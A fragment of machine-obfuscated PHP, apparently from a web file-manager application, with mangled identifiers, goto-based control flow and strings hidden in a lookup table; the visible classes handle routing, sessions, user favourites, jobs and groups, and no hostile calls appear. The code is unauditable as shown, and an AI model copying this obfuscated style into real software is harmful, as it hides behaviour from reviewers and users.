if (isset($e‚øÌµ÷Ë´[$cá’¯Ş®Çñ])) { $Cá½´º—ÀÒ = $e‚øÌµ÷Ë´[$cá’¯Ş®Çñ] . $d ÇÛ»ŠÍ . $AÙÜ£íˆé™[1398] . $AÇ¬ØŒ›‚¡; } } } } } } goto BÊªì‹¥×¦; e½È¾Ìš¦„: } public function link($aÌ‡à…’ƒ² = false, $c­Ù¾Ò¥õ = '') { $aêº„ŒËê =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$aÌ‡à…’ƒ²) { $this->link($aêº„ŒËê[1402], $aêº„ŒËê[1400]); $this->link($aêº„ŒËê[1403], $aêº„ŒËê[1399]); $this->link($aêº„ŒËê[1404], $aêº„ŒËê[1399]); $this->link($aêº„ŒËê[1405], $aêº„ŒËê[1399]); $this->link($aêº„ŒËê[1406], $aêº„ŒËê[1399]); return; } $d™Á­ÃÊ¶Ş = $this->url($aÌ‡à…’ƒ², $c­Ù¾Ò¥õ, !1); if (substr($aÌ‡à…’ƒ², -3) == $aêº„ŒËê[1407]) { echo $aêº„ŒËê[1408] . $d™Á­ÃÊ¶Ş . $aêº„ŒËê[1409] . $aêº„ŒËê[183]; } else { if (substr($aÌ‡à…’ƒ², -4) == $aêº„ŒËê[1410]) { echo $aêº„ŒËê[1411] . $d™Á­ÃÊ¶Ş . $aêº„ŒËê[1412] . $aêº„ŒËê[183]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\136\x2f\x5d\53", "\x3a\x6e\165\155" => "\133\x30\x2d\x39\135\x2b", "\x3a\141\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($AçæÊ÷ ¡ù, $e‰èÜéÔÍí) { $c…ã™£‘¡  =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($AçæÊ÷ ¡ù == $c…ã™£‘¡ [1413]) { $a‡¿ŞÓÌÆ = array_map($c…ã™£‘¡ [1414], $e‰èÜéÔÍí[0]); $d­é…Ää” = strpos($e‰èÜéÔÍí[1], $c…ã™£‘¡ [8]) === 0 ? $e‰èÜéÔÍí[1] : $c…ã™£‘¡ [8] . $e‰èÜéÔÍí[1]; $a¬ÓĞˆ«‚š = $e‰èÜéÔÍí[2]; } else { $a‡¿ŞÓÌÆ = null; $d­é…Ää” = strpos($e‰èÜéÔÍí[0], $c…ã™£‘¡ [8]) === 0 ? $e‰èÜéÔÍí[0] : $c…ã™£‘¡ [8] . $e‰èÜéÔÍí[0]; $a¬ÓĞˆ«‚š = $e‰èÜéÔÍí[1]; } array_push(self::$maps, $a‡¿ŞÓÌÆ); array_push(self::$routes, $d­é…Ää”); array_push(self::$methods, strtoupper($AçæÊ÷ ¡ù)); array_push(self::$callbacks, $a¬ÓĞˆ«‚š); } public static function error($c ½ô´à–«) { self::$errorCallback = $c ½ô´à–«; } public static function haltOnMatch($E–‰Ğ†ºÂ = true) { self::$halts = $E–‰Ğ†ºÂ; } public static function dispatch() { goto eñã¤á»¶; eñã¤á»¶: $có™‰©èÕÓ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d§İÆŠĞËö = parse_url($_SERVER[$có™‰©èÕÓ[1415]], PHP_URL_PATH); $e¶ÓÁ–‹™Á = $_SERVER[$có™‰©èÕÓ[154]]; goto a“£×Ö’†; a“£×Ö’†: $Dßµ‚¬ÅØ = array_keys(static::$patterns); $E¯ô‡Òë = array_values(static::$patterns); $eš» Š²”ä = !1; goto dö‹®Ê’’â; dö‹®Ê’’â: self::$routes = preg_replace($có™‰©èÕÓ[1099], $có™‰©èÕÓ[8], self::$routes); if (in_array($d§İÆŠĞËö, self::$routes)) { $b‹‹‹‹²æ· = array_keys(self::$routes, $d§İÆŠĞËö); foreach ($b‹‹‹‹²æ· as $f¢¸ÚˆÉŒ) { if (self::$methods[$f¢¸ÚˆÉŒ] == $e¶ÓÁ–‹™Á || self::$methods[$f¢¸ÚˆÉŒ] == $có™‰©èÕÓ[1416] || in_array($e¶ÓÁ–‹™Á, self::$maps[$f¢¸ÚˆÉŒ])) { $eš» Š²”ä = !0; if (!is_object(self::$callbacks[$f¢¸ÚˆÉŒ])) { $c˜„ƒæ˜å = explode($có™‰©èÕÓ[8], self::$callbacks[$f¢¸ÚˆÉŒ]); $cÆ¼Š’·‡‹ = end($c˜„ƒæ˜å); $BìÚ¦Û“Âª = explode($có™‰©èÕÓ[1417], $cÆ¼Š’·‡‹); $f‘£Ôî…İ” = new $BìÚ¦Û“Âª[0](); $f‘£Ôî…İ”->{$BìÚ¦Û“Âª[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$f¢¸ÚˆÉŒ]); if (self::$halts) { return; } } } } } else { $c»é¤ßÊÜ = 0; foreach (self::$routes as $f¢¸ÚˆÉŒ) { if (strpos($f¢¸ÚˆÉŒ, $có™‰©èÕÓ[4]) !== !1) { $f¢¸ÚˆÉŒ = str_replace($Dßµ‚¬ÅØ, $E¯ô‡Òë, $f¢¸ÚˆÉŒ); } if (preg_match($có™‰©èÕÓ[1418] . $f¢¸ÚˆÉŒ . $có™‰©èÕÓ[1419], $d§İÆŠĞËö, $D¼İì†‰ÏÆ)) { if (self::$methods[$c»é¤ßÊÜ] == $e¶ÓÁ–‹™Á || self::$methods[$c»é¤ßÊÜ] == $có™‰©èÕÓ[1416] || !empty(self::$maps[$c»é¤ßÊÜ]) && in_array($e¶ÓÁ–‹™Á, self::$maps[$c»é¤ßÊÜ])) { $eš» Š²”ä = !0; array_shift($D¼İì†‰ÏÆ); if (!is_object(self::$callbacks[$c»é¤ßÊÜ])) { $c˜„ƒæ˜å = explode($có™‰©èÕÓ[8], self::$callbacks[$c»é¤ßÊÜ]); $cÆ¼Š’·‡‹ = end($c˜„ƒæ˜å); $BìÚ¦Û“Âª = explode($có™‰©èÕÓ[1417], $cÆ¼Š’·‡‹); $f‘£Ôî…İ” = new $BìÚ¦Û“Âª[0](); if (!method_exists($f‘£Ôî…İ”, $BìÚ¦Û“Âª[1])) { echo $có™‰©èÕÓ[1420]; } else { call_user_func_array(array($f‘£Ôî…İ”, $BìÚ¦Û“Âª[1]), $D¼İì†‰ÏÆ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$c»é¤ßÊÜ], $D¼İì†‰ÏÆ); if (self::$halts) { return; } } } } $c»é¤ßÊÜ++; } } if ($eš» Š²”ä == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $EÁ¥ô•¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; header($_SERVER[$EÁ¥ô•¢[1421]] . $EÁ¥ô•¢[1422]); echo $EÁ¥ô•¢[1423]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$có™‰©èÕÓ[1415]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto bÓ„ÈƒÁº¤; bÓ„ÈƒÁº¤: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto BÆİîœä¸å; F¬’²—ñˆ: $C•ï¼ÙƒÑÁ = $GLOBALS[$d†ŠÉù©ê„[6]][$d†ŠÉù©ê„[352]]; self::$sessionTime = $C•ï¼ÙƒÑÁ[$d†ŠÉù©ê„[1424]]; $eĞ¡ˆÊ¾çˆ = isset($GLOBALS[$d†ŠÉù©ê„[1425]]) ? $GLOBALS[$d†ŠÉù©ê„[1425]] : SESSION_ID; goto e›£¿ šë; dåì‹ààó: $a¼ƒ…ŠÈÊ¤ = $C•ï¼ÙƒÑÁ[$a÷Ö…ÕùÈõ]; $EŒ¨²î×®í = $C•ï¼ÙƒÑÁ[$d†ŠÉù©ê„[781]]; switch ($a÷Ö…ÕùÈõ) { case $d†ŠÉù©ê„[17]: self::$handle = Model($d†ŠÉù©ê„[782]); break; case $d†ŠÉù©ê„[783]: self::$handle = new CacheRedis($a¼ƒ…ŠÈÊ¤, $EŒ¨²î×®í); break; case $d†ŠÉù©ê„[784]: self::$handle = new CacheMemcached($a¼ƒ…ŠÈÊ¤, $EŒ¨²î×®í); break; case $d†ŠÉù©ê„[171]: $a¼ƒ…ŠÈÊ¤[$d†ŠÉù©ê„[75]] = $a¼ƒ…ŠÈÊ¤[$d†ŠÉù©ê„[75]] . $d†ŠÉù©ê„[1427]; self::$handle = new CacheFile($a¼ƒ…ŠÈÊ¤, $EŒ¨²î×®í); default: break; } goto Bí«äÜ³­…; BÆİîœä¸å: $d†ŠÉù©ê„ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $b×Í®•¨¢Œ = false; if ($b×Í®•¨¢Œ) { return $b×Í®•¨¢Œ; } goto F¬’²—ñˆ; e›£¿ šë: if (self::$sessionSign) { } else { if (Cookie::get($eĞ¡ˆÊ¾çˆ)) { self::$sessionSign = Cookie::get($eĞ¡ˆÊ¾çˆ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($eĞ¡ˆÊ¾çˆ, self::$sessionSign, self::$sessionTime); $a÷Ö…ÕùÈõ = $C•ï¼ÙƒÑÁ[$d†ŠÉù©ê„[1426]]; goto dåì‹ààó; Bí«äÜ³­…: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $b×Í®•¨¢Œ = new self(); return $b×Í®•¨¢Œ; goto AˆæŞ‰”²†; AˆæŞ‰”²†: } public static function sign($CÙíÉš–‘Ë = false) { $CÙíÉš–‘Ë && (self::$sessionSign = $CÙíÉš–‘Ë); self::init(); return self::$sessionSign; } public static function set($dÚÖö› –, $B†œÇ‘ŒÚñ = false) { self::init(); if (is_array($dÚÖö› –)) { foreach ($dÚÖö› – as $bÜ›Ü†«ğ => $A½³ö÷†Íõ) { array_set_value(self::$data, $bÜ›Ü†«ğ, $A½³ö÷†Íõ); } } else { array_set_value(self::$data, $dÚÖö› –, $B†œÇ‘ŒÚñ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($dÓ‚µøÇ  = false) { self::init(); if (!$dÓ‚µøÇ ) { return self::$data; } return array_get_value(self::$data, $dÓ‚µøÇ ); } public static function remove($CàÏŒÈ‰†³) { self::init(); unset(self::$data[$CàÏŒÈ‰†³]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[åÌÛ»ô¢‚ö™][786])) { self::$handle->clearTimeout(); } } } goto bŠìù¯Èèä; D¸‚ŸË¢õÓ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\164\x61\163\153\114\x69\163\x74"; public $field = array("\156\141\155\145", "\x74\x79\x70\x65", "\145\x76\145\x6e\x74", "\x74\151\x6d\x65", "\144\145\x73\143", "\163\x79\x73\164\145\155", "\145\156\141\142\x6c\145", "\x6c\141\163\x74\x52\x75\156", "\x73\157\x72\x74"); public function listData($aÅ·‚ßõÇ = false, $Få›ØçÙÖÁ = "\x73\x6f\162\164", $eÒİšæßã‚ = false) { return parent::listData($aÅ·‚ßõÇ, $Få›ØçÙÖÁ, $eÒİšæßã‚); } public function add($eßßÚëƒŸ) { $aËæİÃõÂƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÚ†±¥…‚Ü = $this->findByName($eßßÚëƒŸ[$aËæİÃõÂƒ[28]]); if ($AÚ†±¥…‚Ü) { return !1; } $eßßÚëƒŸ[$aËæİÃõÂƒ[1429]] = 0; $eßßÚëƒŸ[$aËæİÃõÂƒ[2160]] = $this->getSort(); return parent::insert($eßßÚëƒŸ); } private function getSort() { $F¬›Àç› =& $_SERVER[åÌÛ»ô¢‚ö™]; $fº’–ôíğÒ = parent::listData(); $Bó”½¦Ö³¶ = array_to_keyvalue($fº’–ôíğÒ, $F¬›Àç›[33], $F¬›Àç›[2160]); return empty($Bó”½¦Ö³¶) ? 0 : max($Bó”½¦Ö³¶) + 1; } public function update($FòÆ”Æäğ¥, $fˆİÁÊ£Š) { $D¡Åáö¥Ÿ¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eš×àñùÃ× = $this->listData($FòÆ”Æäğ¥); $ağÑŸŒ¡Î¨ = $this->findByName($fˆİÁÊ£Š[$D¡Åáö¥Ÿ¿[28]]); if (!$Eš×àñùÃ× || $ağÑŸŒ¡Î¨ && $ağÑŸŒ¡Î¨[$D¡Åáö¥Ÿ¿[392]] != $Eš×àñùÃ×[$D¡Åáö¥Ÿ¿[392]]) { return !1; } return parent::update($FòÆ”Æäğ¥, $fˆİÁÊ£Š); } public function remove($dªŸ™‰Ä£¢, $C‰ƒâ¹Ş“± = false) { $C–¸è‹ù¿ë =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aº¢³É‘²ƒ = $this->listData($dªŸ™‰Ä£¢); if (!$Aº¢³É‘²ƒ) { return; } if (!$C‰ƒâ¹Ş“± && $Aº¢³É‘²ƒ[$C–¸è‹ù¿ë[1106]] == $C–¸è‹ù¿ë[83]) { return !1; } return parent::remove($dªŸ™‰Ä£¢); } public function enable($CöÂÁ„à‹ø, $cîì¯è”) { return $this->update($CöÂÁ„à‹ø, array($_SERVER[åÌÛ»ô¢‚ö™][2536] => $cîì¯è”)); } public function run($d¨Õ¢Ìåß) { return $this->update($d¨Õ¢Ìåß, array($_SERVER[åÌÛ»ô¢‚ö™][2545] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($fµ¸–îÑÜ¯) { $dƒ¨—ƒÅÒ¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($dƒ¨—ƒÅÒ¹[2234] => array(USER_ID, $dƒ¨—ƒÅÒ¹[2546])); } protected function listData() { $Fí­¯àÌ½à =& $_SERVER[åÌÛ»ô¢‚ö™]; $fèöØŸ£®È = array($Fí­¯àÌ½à[1457] => USER_ID, $Fí­¯àÌ½à[460] => 0); $e”±Ûø†•Ğ = $Fí­¯àÌ½à[2547]; $bŞÄë¥‚ñ = $this->field($e”±Ûø†•Ğ)->where($fèöØŸ£®È)->order($Fí­¯àÌ½à[2548])->select(); return $bŞÄë¥‚ñ ? $bŞÄë¥‚ñ : array(); } protected function resetCache() { } protected function listView() { goto eÙ±ˆšîµ; DÔ‡Ìˆçö¨: $F¡Ì‘˜ƒÇ = array_to_keyvalue($eô†¥Û›Ô, $C‘ù½óßš´[33], $C‘ù½óßš´[75]); if (!$F¡Ì‘˜ƒÇ) { return $Cšê’ˆ»‘; } $bíæ””ºÚÈ = 2000; goto F°™Ì¾£«; F°™Ì¾£«: $B‚™ùÒÕÊÜ = array($C‘ù½óßš´[408] => array($C‘ù½óßš´[409], $F¡Ì‘˜ƒÇ)); $E¬ÓŠ›†¶Ù = Model($C‘ù½óßš´[778])->listSource($B‚™ùÒÕÊÜ, $bíæ””ºÚÈ); $E¬ÓŠ›†¶Ù = array_merge($E¬ÓŠ›†¶Ù[$C‘ù½óßš´[73]], $E¬ÓŠ›†¶Ù[$C‘ù½óßš´[74]]); goto bÏÜÜ„çÖ; eÙ±ˆšîµ: $C‘ù½óßš´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cšê’ˆ»‘ = $this->listData(); $eô†¥Û›Ô = array_filter_by_field($Cšê’ˆ»‘, $C‘ù½óßš´[29], $C‘ù½óßš´[407]); goto DÔ‡Ìˆçö¨; bÏÜÜ„çÖ: $E¬ÓŠ›†¶Ù = array_to_keyvalue($E¬ÓŠ›†¶Ù, $C‘ù½óßš´[394]); foreach ($Cšê’ˆ»‘ as $DÉ¼¼Úİ => $bˆ¡øŸ˜Ÿ) { $bÒ÷Ï³èÁ = $E¬ÓŠ›†¶Ù[$bˆ¡øŸ˜Ÿ[$C‘ù½óßš´[75]]]; $bÒ÷Ï³èÁ = $bÒ÷Ï³èÁ ? $bÒ÷Ï³èÁ : array(); $Cšê’ˆ»‘[$DÉ¼¼Úİ] = array_merge($bÒ÷Ï³èÁ, $bˆ¡øŸ˜Ÿ); } return $Cšê’ˆ»‘; goto b±Şˆ ÜÔ; b±Şˆ ÜÔ: } protected function addFav($CîæÀ¡Ã˜, $c—†÷Çø = '', $dï“ÁáÊôÚ = "\163\x6f\165\162\143\145") { goto fí§›¬÷Èê; fí§›¬÷Èê: $EÇîÄÙ‚±¾ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f‹ŞÛß³«‰ = array($EÇîÄÙ‚±¾[1457] => USER_ID, $EÇîÄÙ‚±¾[460] => 0, $EÇîÄÙ‚±¾[413] => $dï“ÁáÊôÚ, $EÇîÄÙ‚±¾[412] => $CîæÀ¡Ã˜); if ($this->where($f‹ŞÛß³«‰)->find()) { return !1; } goto a¯àÂ‡ªê; Fô—…†–İ: return $this->add($FØ½íé…ª»); goto F–íÜÏ¡³; a¯àÂ‡ªê: $f‹ŞÛß³«‰ = array($EÇîÄÙ‚±¾[1457] => USER_ID, $EÇîÄÙ‚±¾[460] => 0); $B›¡ç‹“°À = $this->where($f‹ŞÛß³«‰)->max($EÇîÄÙ‚±¾[2160]); if (!$B›¡ç‹“°À) { $B›¡ç‹“°À = 0; } goto fçŒ´êğÈà; fçŒ´êğÈà: if (!$c—†÷Çø && $dï“ÁáÊôÚ == $EÇîÄÙ‚±¾[407]) { $eá—ßß¹õœ = Model($EÇîÄÙ‚±¾[1143])->where(array($EÇîÄÙ‚±¾[408] => $CîæÀ¡Ã˜))->find(); if (!$eá—ßß¹õœ) { return !1; } $c—†÷Çø = $eá—ßß¹õœ[$EÇîÄÙ‚±¾[28]]; } $c—†÷Çø = $this->getAutoName($c—†÷Çø); $FØ½íé…ª» = array($EÇîÄÙ‚±¾[1457] => USER_ID, $EÇîÄÙ‚±¾[460] => 0, $EÇîÄÙ‚±¾[411] => $c—†÷Çø, $EÇîÄÙ‚±¾[412] => $CîæÀ¡Ã˜, $EÇîÄÙ‚±¾[413] => $dï“ÁáÊôÚ, $EÇîÄÙ‚±¾[2142] => $B›¡ç‹“°À + 1); goto Fô—…†–İ; F–íÜÏ¡³: } protected function remove($eÛ÷Á©·¯) { $f×Ö¯Éø›ö =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¿åŸè²½İ = array($f×Ö¯Éø›ö[1457] => USER_ID, $f×Ö¯Éø›ö[410] => $eÛ÷Á©·¯); return $this->where($B¿åŸè²½İ)->delete(); } protected function removeByName($a†ô‡µªÚ) { $EØ˜ìè¸—ˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f§Ö‘²öÁ¤ = array($EØ˜ìè¸—ˆ[1457] => USER_ID, $EØ˜ìè¸—ˆ[411] => $a†ô‡µªÚ, $EØ˜ìè¸—ˆ[460] => 0); return $this->where($f§Ö‘²öÁ¤)->delete(); } protected function rename($DŠ‚½¿¸âè, $B’¢ÓÎ¸ù) { $fïˆÄË´Å =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($DŠ‚½¿¸âè == $B’¢ÓÎ¸ù) { return !1; } $AÌ‡Õ¼¤ = $this->getAutoName($B’¢ÓÎ¸ù); if ($B’¢ÓÎ¸ù != $AÌ‡Õ¼¤) { return !1; } $C´òîİğè‹ = array($fïˆÄË´Å[1457] => USER_ID, $fïˆÄË´Å[460] => 0, $fïˆÄË´Å[28] => $DŠ‚½¿¸âè); return $this->where($C´òîİğè‹)->save(array($fïˆÄË´Å[28] => $B’¢ÓÎ¸ù)); } protected function resetSort($FÙ í‹—é­) { $F·Ÿ¯•ÄÈ˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÙ í‹—é­ = is_array($FÙ í‹—é­) ? $FÙ í‹—é­ : array(); $B‡ßÆ“´Æ = array($F·Ÿ¯•ÄÈ˜[1457] => USER_ID); for ($B…ƒ·ê–Ç = 0; $B…ƒ·ê–Ç < count($FÙ í‹—é­); $B…ƒ·ê–Ç++) { $B‡ßÆ“´Æ[$F·Ÿ¯•ÄÈ˜[410]] = $FÙ í‹—é­[$B…ƒ·ê–Ç]; $this->where($B‡ßÆ“´Æ)->save(array($F·Ÿ¯•ÄÈ˜[2142] => $B…ƒ·ê–Ç + 1)); } return !0; } protected function moveTop($E¿à¬ŒªÇø) { goto eÒ©çË‡Ï®; eÒ©çË‡Ï®: $Ašã¨ƒ——¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¨ç¤ŞÖ†« = array($Ašã¨ƒ——¸[1457] => USER_ID, $Ašã¨ƒ——¸[460] => 0); $aÜÙÕ“®Â = $this->where($b¨ç¤ŞÖ†«)->where(array($Ašã¨ƒ——¸[28] => $E¿à¬ŒªÇø))->find(); goto DÃ¸šÉŸ³°; AšÉã‘­‘: $a¯ÈªµùÄ¤ = $cŒåÛÇ›£¾; $cŒåÛÇ›£¾ = array_remove_value($cŒåÛÇ›£¾, $aÜÙÕ“®Â[$Ašã¨ƒ——¸[392]]); array_unshift($cŒåÛÇ›£¾, $aÜÙÕ“®Â[$Ašã¨ƒ——¸[392]]); goto e­²¸–…çô; e­²¸–…çô: return $this->resetSort($cŒåÛÇ›£¾); goto BÙáêã×ø•; DÃ¸šÉŸ³°: if (!$aÜÙÕ“®Â) { return; } $cŒåÛÇ›£¾ = $this->field($Ašã¨ƒ——¸[392])->where($b¨ç¤ŞÖ†«)->order($Ašã¨ƒ——¸[2548])->select(); $cŒåÛÇ›£¾ = array_to_keyvalue($cŒåÛÇ›£¾, $Ašã¨ƒ——¸[33], $Ašã¨ƒ——¸[392]); goto AšÉã‘­‘; BÙáêã×ø•: } protected function moveBottom($DàÃš½») { $Fß‰¶Ğ¸ä› =& $_SERVER[åÌÛ»ô¢‚ö™]; $a¥‰ÊË „‚ = array($Fß‰¶Ğ¸ä›[1457] => USER_ID, $Fß‰¶Ğ¸ä›[460] => 0); $cİá¹Œ—Øˆ = $this->where($a¥‰ÊË „‚)->max($Fß‰¶Ğ¸ä›[2160]); $eñ‘—ÀÙ¢Á = array($Fß‰¶Ğ¸ä›[2160] => $cİá¹Œ—Øˆ + 1); return $this->where($a¥‰ÊË „‚)->where(array($Fß‰¶Ğ¸ä›[28] => $DàÃš½»))->save($eñ‘—ÀÙ¢Á); } private function getAutoName($cİÖ„ÜğÂå) { goto CñÈáè–¤; B‚¼‘§‚Š: $dïøÛªãƒ› = array_to_keyvalue($dïøÛªãƒ›, $E»Ÿ»ãò÷[33], $E»Ÿ»ãò÷[28]); if (!$dïøÛªãƒ› || !in_array($cİÖ„ÜğÂå, $dïøÛªãƒ›)) { return $cİÖ„ÜğÂå; } for ($dä‡íœã— = 0; $dä‡íœã— < count($dïøÛªãƒ›); $dä‡íœã—++) { if (!in_array($cİÖ„ÜğÂå . "\50{$dä‡íœã—}\51", $dïøÛªãƒ›)) { return $cİÖ„ÜğÂå . "\x28{$dä‡íœã—}\51"; } } goto e÷ÙÅåª¦; e÷ÙÅåª¦: return $cİÖ„ÜğÂå . "\50{$dä‡íœã—}\51"; goto dÂ»í´—Â; CñÈáè–¤: $E»Ÿ»ãò÷ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÑ­ÍáßÛ = array($E»Ÿ»ãò÷[1457] => USER_ID, $E»Ÿ»ãò÷[460] => 0); $dïøÛªãƒ› = $this->field($E»Ÿ»ãò÷[28])->where($fÑ­ÍáßÛ)->select(); goto B‚¼‘§‚Š; dÂ»í´—Â: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\152\x6f\x62\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\144\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\154\146\x4a\157\x62\114\x69\163\x74"; public function listData($bö†ä¢°í± = false, $cÆî‹±»®¬ = "\163\157\x72\x74", $a©ªê†ã’í = false) { return parent::listData($bö†ä¢°í±, $cÆî‹±»®¬, $a©ªê†ã’í); } public function remove($C¨Şé¨ãèï) { return parent::remove($C¨Şé¨ãèï); } public function add($cÔ§ÙÓì‡Ó) { $dÅŞïë•Óî =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->findByName($cÔ§ÙÓì‡Ó[$dÅŞïë•Óî[28]])) { return !1; } $cÔ§ÙÓì‡Ó[$dÅŞïë•Óî[2160]] = $this->getSort(); return parent::insert($cÔ§ÙÓì‡Ó); } private function getSort() { $cÀ™äÀõ“ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eİ÷š™´ß = parent::listData(); $dÅ½ÍİÂâ© = array_to_keyvalue($Eİ÷š™´ß, $cÀ™äÀõ“[33], $cÀ™äÀõ“[2160]); return empty($dÅ½ÍİÂâ©) ? 0 : max($dÅ½ÍİÂâ©) + 1; } public function update($FÉÌ¦¼†Àã, $bš§ÚöÇì…) { $Cõâ‘»´¦Á =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dæã„¸ˆ—‡ = parent::listData($FÉÌ¦¼†Àã); $Bâ·Ø²Ñø™ = $this->findByName($bš§ÚöÇì…[$Cõâ‘»´¦Á[28]]); if (!$Dæã„¸ˆ—‡ || $Bâ·Ø²Ñø™ && $Bâ·Ø²Ñø™[$Cõâ‘»´¦Á[392]] != $Dæã„¸ˆ—‡[$Cõâ‘»´¦Á[392]]) { return !1; } return parent::update($FÉÌ¦¼†Àã, $bš§ÚöÇì…); } public function setUserJob($FÀå“„Ú¢î, $bôõ»£âÖ¥) { goto f‰§Ö¥ˆ—; f‰§Ö¥ˆ—: $EÎãù¾¿èç =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!is_array($bôõ»£âÖ¥)) { $bôõ»£âÖ¥ = array($bôõ»£âÖ¥); } $aÙ¼½òšÁÙ = parent::listData(); goto a¿öêÓ‘×; a¿öêÓ‘×: $E©öÀ‚…ßõ = array_to_keyvalue($aÙ¼½òšÁÙ, $EÎãù¾¿èç[28]); $fÅÅğˆãÔä = $EÎãù¾¿èç[377]; foreach ($bôõ»£âÖ¥ as $Dìˆé´¡·‚) { if ($E©öÀ‚…ßõ[$Dìˆé´¡·‚]) { $fÅÅğˆãÔä .= $E©öÀ‚…ßõ[$Dìˆé´¡·‚][$EÎãù¾¿èç[392]] . $EÎãù¾¿èç[47]; } else { $dà¥¶¶Â†Ù = $this->add($Dìˆé´¡·‚); $fÅÅğˆãÔä .= $dà¥¶¶Â†Ù . $EÎãù¾¿èç[47]; } } goto còø¬Œµëº; còø¬Œµëº: $fÅÅğˆãÔä = rtrim($fÅÅğˆãÔä, $EÎãù¾¿èç[47]); Model($EÎãù¾¿èç[503])->metaSet($FÀå“„Ú¢î, self::JOB_KEY, $fÅÅğˆãÔä); goto eÓ¶¾ŒãÑî; eÓ¶¾ŒãÑî: } public function getUserJob($E†¼±íŒ÷) { $B‹š¹Ù’àÙ = Model($_SERVER[åÌÛ»ô¢‚ö™][503])->metaGet($E†¼±íŒ÷); return $this->getUserJobInfo($B‹š¹Ù’àÙ[self::JOB_KEY]); } public function getUserJobInfo($bŠÀ“Æ×¢) { goto f»ÙŒ¦ƒ®Ó; aòéî–‡•: $BÃ®©‹±ñ… = array_remove_key($BÃ®©‹±ñ…, $A¤³¼»“×•[200]); $EìèÛå½‚Ì = array(); foreach ($e²îñ’ïê as $DŞ¿‡’¥«) { if (isset($BÃ®©‹±ñ…[$DŞ¿‡’¥«])) { $EìèÛå½‚Ì[] = $BÃ®©‹±ñ…[$DŞ¿‡’¥«]; } } goto AŠˆ²Üª‚; AŠˆ²Üª‚: return $EìèÛå½‚Ì; goto EæË…èí; f»ÙŒ¦ƒ®Ó: $A¤³¼»“×• =& $_SERVER[åÌÛ»ô¢‚ö™]; $e²îñ’ïê = explode($A¤³¼»“×•[47], $bŠÀ“Æ×¢); $BÃ®©‹±ñ… = parent::listData(); goto aòéî–‡•; EæË…èí: } } goto aˆ¢î«•Ÿä; eåº¤º÷­„: define($_SERVER[åÌÛ»ô¢‚ö™][1967], 3); define($_SERVER[åÌÛ»ô¢‚ö™][1968], 4); define($_SERVER[åÌÛ»ô¢‚ö™][1969], 5); goto c‚Ìº•à´ç; a‰‡ì›Ã: class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\160"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\x6d\x65" => "\147\162\157\x75\x70\x5f\155\145\164\141", "\155\145\x74\x61\106\151\145\154\144" => "\147\x72\157\165\160\x49\104"); protected function cacheFunctionAlias($fà¢‚ÌÁ) { $F‚·´›š‡¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($F‚·´›š‡¦[2207] => array($fà¢‚ÌÁ[0], $F‚·´›š‡¦[2208]), $F‚·´›š‡¦[2209] => array($fà¢‚ÌÁ[0], $F‚·´›š‡¦[2208])); } protected function getInfo($D™‡…—Âô) { $EŒ†¿ß‰¬õ = $this->getInfoSimple($D™‡…—Âô); if (!$EŒ†¿ß‰¬õ) { return !1; } return $this->_listDataApplyItem($EŒ†¿ß‰¬õ); } protected function getInfoSimple($fÄË¬æä’ê, $a›·•‘÷îë = false) { $B…ÒâØÜ½ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($a›·•‘÷îë) { $cÀ­ŒœÊ÷ = array($B…ÒâØÜ½[2138] => intval($fÄË¬æä’ê)); $cŒÙã«ÍˆÎ = $this->where($cÀ­ŒœÊ÷)->find(); return is_array($cŒÙã«ÍˆÎ) ? $cŒÙã«ÍˆÎ : array(); } return $this->cacheFunctionGet($B…ÒâØÜ½[2210], $fÄË¬æä’ê); } protected function groupAdd($cÈßÑ »ªë) { goto 